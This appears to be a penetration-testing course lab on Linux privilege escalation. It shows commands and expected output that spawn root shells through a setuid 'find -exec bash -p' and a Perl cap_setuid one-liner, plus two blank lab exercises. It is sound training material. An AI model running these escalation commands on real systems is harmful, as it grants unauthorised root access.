# Abusing Setuid Binaries and Capabilities

Executing the passswd program
>``` shell
>joe@debian-privesc:~$ passwd
>
># ========== Expected Result ==========
>Changing password for joe.
>Current password:
># =====================================
>```

Inspecting passwd's process credentials (1)
>``` shell
>joe@debian-privesc:~$ ps u -C passwd
>
># ========== Expected Result ==========
>USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
>root      1932  0.0  0.1   9364  2984 pts/0    S+   01:51   0:00 passwd
># =====================================
>```

Inspecting passwd's process credentials (2)
>``` shell
>joe@debian-privesc:~$ grep Uid /proc/1932/status
>
># ========== Expected Result ==========
>Uid:	1000	0	0	0
># =====================================
>```

Inspecting passwd's process credentials (3)
>``` shell
>joe@debian-privesc:~$ cat /proc/1131/status | grep Uid
>
># ========== Expected Result ==========
>Uid:	1000	1000	1000	1000
># =====================================
>```

Revealing the SUID flag in the passwd binary application
>``` shell
>joe@debian-privesc:~$ ls -asl /usr/bin/passwd
>
># ========== Expected Result ==========
>64 -rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
># =====================================
>```

Getting a root shell by abusing SUID program
>``` shell
>joe@debian-privesc:~$ find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
>
># ========== Expected Result ==========
>bash-5.0# id
>uid=1000(joe) gid=1000(joe) euid=0(root) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
># =====================================
>
>bash-5.0# whoami
>
># ========== Expected Result ==========
>root
># =====================================
>```

Manually Enumerating Capabilities
>``` shell
>joe@debian-privesc:~$ /usr/sbin/getcap -r / 2>/dev/null
>
># ========== Expected Result ==========
>/usr/bin/ping = cap_net_raw+ep
>/usr/bin/perl = cap_setuid+ep
>/usr/bin/perl5.28.1 = cap_setuid+ep
>/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
>/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
># =====================================
>```

Getting a root shell through capabilities exploitation
>``` shell
>joe@debian-privesc:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
>
># ========== Expected Result ==========
>perl: warning: Setting locale failed.
>...
># =====================================
>
># id
>
># ========== Expected Result ==========
>uid=0(root) gid=1000(joe) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
># =====================================
>```

Lab 1 - Connect to VM 1 and repeat the steps discussed in this section in order to obtain a root shell. Which utility can we use to manually search for misconfigured capabilities?
>``` shell
>
>```
>

Lab 2 - Connect to VM 2 and gain a root shell by abusing capabilities.
>``` shell
>
>```
>
